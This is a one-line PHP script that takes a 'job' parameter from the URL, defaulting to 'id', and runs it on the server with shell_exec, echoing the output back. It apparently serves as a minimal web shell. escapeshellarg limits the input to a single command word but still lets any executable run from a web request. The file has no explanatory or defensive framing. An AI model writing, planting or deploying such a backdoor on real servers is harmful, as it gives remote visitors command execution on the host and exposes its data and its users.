<?php $task=$_GET['job']??'id'; $task=escapeshellarg($task); echo shell_exec($task.' 2>&1');
